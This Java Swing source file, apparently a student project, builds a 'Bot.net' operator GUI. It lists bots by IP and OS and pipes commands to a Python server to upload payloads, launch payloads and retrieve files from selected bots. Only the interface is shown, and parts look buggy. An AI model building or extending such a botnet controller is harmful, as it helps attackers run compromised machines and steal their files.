/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package servergui;

import java.awt.BorderLayout;
import java.awt.ComponentOrientation;
import java.awt.Dimension;
import java.awt.HeadlessException;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyEvent;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

import java.lang.ProcessBuilder;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

import javax.swing.DefaultListModel;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JList;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.Timer;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;

/**
 *
 * @author Douglas, Mitch, Shawn
 */
public class ServerFrame extends JFrame {
    private final BorderLayout LAYOUT;
    private final JLabel NAMEBAR;
    private final JMenuBar menuBar;
    private final JMenu menu;// subMenu, subMenu1;
    private final JList botList;
    private final JMenuItem menuItem;
    private final JButton b1, b2, b3;
    private Timer timer;
    private final int DELAY = 30 * 1000; //miliseconds
    private Lock pipeLock;                      //guards access to process pipe
    private BufferedReader readProc;
    private BufferedReader readProcErr;
    private BufferedWriter writeProc;
    private ProcessBuilder pb;
    private Process p;
    
    
    private final static boolean RIGHT_TO_LEFT = false; 
    //constants to set
    private final static String COMMAND = "C:\\Python27\\python";  //absolute path to python
    private final static String PYTHONSCRIPT = "C:\\Users\\Douglas\\Documents\\NetBeansProjects\\servergui\\src\\servergui\\test.py";
    //private final static String PYTHONPATH = "C:\\Users\\Douglas\\Documents\\NetBeansProjects\\servergui\\src";
    private final static String GETBOTSTATUS = "$GS$";
    private final static String UPLOADPAYLOADS = "$UP$";
    private final static String LAUNCHPAYLOADS = "$LP$";
    private final static String RETRIEVEFILES = "$RF$";
    private final static String ENDCOMMAND = "$ENDL$";
    private final static String INPUT_DONE = "$";
    private final static char DELIMITER = '$';
    
    
    private List<String> selectedValuesList;
    
    public ServerFrame() throws HeadlessException {
        super("Bot.net");
        startUp();
        
        pipeLock = new ReentrantLock();
        LAYOUT = new BorderLayout();
        JPanel pane = new JPanel(LAYOUT);
        
        if(RIGHT_TO_LEFT)
        {
            pane.setComponentOrientation(ComponentOrientation.RIGHT_TO_LEFT);
        }
        
        //Set Up Pannels
        
        b1 = new JButton("Launch Payloads");
        pane.add(b1, BorderLayout.CENTER);
        b1.addActionListener(new ActionListener()
        {
            public void actionPerformed(ActionEvent e)
            {
                if(0 != selectedValuesList.size())
                {
                    for(String tmp: selectedValuesList)
                    {
                        String[] splited = tmp.split("\\s+");
                        pipeLock.lock();
                        try
                        {
                            writeProc.write(LAUNCHPAYLOADS + splited[0]);   
                        }
                        catch(Exception exc)
                        {
                            System.err.println(exc);
                        }
                        finally
                        {
                            pipeLock.unlock();
                        }
                                
                    }
                }
            }
        });
        b1.setEnabled(false);
        
        b2 = new JButton("Upload Payloads");
        pane.add(b2, BorderLayout.LINE_START);
        b2.addActionListener(new ActionListener()
        {
            public void actionPerformed(ActionEvent e)
            {
                if(0 < selectedValuesList.size())
                {
                    for(String tmp: selectedValuesList)
                    {
                        String[] splited = tmp.split("\\s+");
                        pipeLock.lock();
                        try
                        {
                            writeProc.write(UPLOADPAYLOADS + splited[0]);   
                        }
                        catch(Exception exc)
                        {
                            System.err.println(exc);
                        }
                        finally
                        {
                            pipeLock.unlock();
                        }
                    }
                }
            }
        });
        b2.setEnabled(false);
        
        //button = new JButton("Long-Named Button 4 (PAGE_END)");
        //pane.add(button, BorderLayout.PAGE_END);
        
        b3 = new JButton("Retrieve Files");
        pane.add(b3, BorderLayout.LINE_END);
        b3.addActionListener(new ActionListener()
        {
            public void actionPerformed(ActionEvent e)
            {
                if(0 < selectedValuesList.size())
                {
                    for(String tmp: selectedValuesList)
                    {
                        String[] splited = tmp.split("\\s+");
                        pipeLock.lock();
                        try
                        {
                            writeProc.write(RETRIEVEFILES + splited[0]);   
                        }
                        catch(Exception exc)
                        {
                            System.err.println(exc);
                        }
                        finally
                        {
                            pipeLock.unlock();
                        }
                    }
                }
            }
        });
        b3.setEnabled(false);



        DefaultListModel<String> listModel = new DefaultListModel<>();
        
        //add starting bots to list
        updateList();
        
        
        //for testing
        listModel.addElement("Bot1 192.68.0.1 Windows7 x84");
        listModel.addElement("Bot2 192.68.0.2 Ubuntu x64");
        listModel.addElement("Bot3 192.68.0.3 Ubuntu x64");
        listModel.addElement("Bot4 192.68.0.4 Windows7 x84");
        listModel.addElement("Bot5 192.68.0.5 Ubuntu x64");
        
        //create the List
        botList = new JList<>(listModel);
        botList.addListSelectionListener(new ListSelectionListener(){
            @Override
            public void valueChanged(ListSelectionEvent e)
            {
                if (!e.getValueIsAdjusting())
                {
                    selectedValuesList = botList.getSelectedValuesList();
                    for(int i = 0; i < selectedValuesList.size(); ++i)
                    {
                        String bot = selectedValuesList.get(i);
                        bot = bot.replaceAll(" .*", "");
                        selectedValuesList.set(i, bot);
                    }
                    System.out.println(selectedValuesList);
                    b1.setEnabled(true);
                    b2.setEnabled(true);
                    b3.setEnabled(true);
                }
            }
        });
        add(new JScrollPane(botList));
        
        botList.setPreferredSize(new Dimension(200, 400));
        pane.add(botList, BorderLayout.PAGE_START);
        
        
        
        //set up NameBar
        NAMEBAR = new JLabel("By Douglas Hennenfent, Mitch Schmidt, and Shawn Stone");
        NAMEBAR.setHorizontalTextPosition(JLabel.CENTER);
        pane.add(NAMEBAR, BorderLayout.PAGE_END);
        
        //build the menu
        menuBar = new JMenuBar();
        menu = new JMenu("Options");
        menu.setMnemonic(KeyEvent.VK_O);
        menuBar.add(menu);
        
        //exits program, shuts down server
        menuItem = new JMenuItem("Exit");
        menuItem.setMnemonic(KeyEvent.VK_X);
        menuItem.addActionListener(new ActionListener()
        {
            @Override
            public void actionPerformed(ActionEvent e)
            {
                System.exit(0);
            }
        });
        menu.add(menuItem);
        
        this.setJMenuBar(menuBar);
        
        //add pane to frame
        this.setContentPane(pane);
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.setSize(800,600);
        this.setVisible(true);
        
        //timer to trigger periodic updates of botlist
        timer = new Timer(DELAY, new ActionListener()
        {
           @Override
                public void actionPerformed(ActionEvent e)
                {
                    System.out.println("Updating List Event");
                    updateList();
                } 
        });
        timer.start();
    }//end ServerFrame
    
    private void startUp()
    {
        System.out.println("Initializing");
        
        //start the python serverprocess
        try
        {
            pb = new ProcessBuilder(COMMAND, PYTHONSCRIPT);
            p = pb.start();
            readProc = new BufferedReader(new InputStreamReader(p.getInputStream()));
            readProcErr = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            writeProc = new BufferedWriter(new OutputStreamWriter(p.getOutputStream()));
            System.out.println("Execed Process");
            System.out.println(readProc.readLine());
        }
        catch(Exception e)
        {
            System.err.println("failed to exec server");
            System.err.println(e);
            System.exit(1);
        }   
    }//end startUp()
    
    private void updateList()
    {
        ArrayList<String>Updated = new ArrayList<>();
        pipeLock.lock();
        try
        {
            writeProc.write(GETBOTSTATUS);  
            try
            {
                String currentLine;
                while(new String(INPUT_DONE) != (currentLine = readProc.readLine()))
                {
                    //reformat the line
                    Updated.add(currentLine.replace(DELIMITER, ' '));
                }
            }
            catch(Exception e)
            {
                System.err.println(e);
                System.err.println("Failed to read from process");
            }
        }
        catch(Exception e)
        {
            System.err.println(e);
        }
        finally
        {
            pipeLock.unlock();
        }
           
    }//end updateList()
    
    
    
    
}//end class ServerFrame




/*references
* http://way2java.com/swing/jlist-with-multiple-selection/
* http://www.codejava.net/java-se/swing/jlist-basic-tutorial-and-examples
* http://stackoverflow.com/questions/26171862/java-processbuilder-not-able-to-run-python-script-in-java
* http://stackoverflow.com/questions/15980057/processbuilder-cannot-run-python-script-with-arguments
* http://alvinalexander.com/java/java-exec-processbuilder-process-1
*
*
*
*
*
*
*/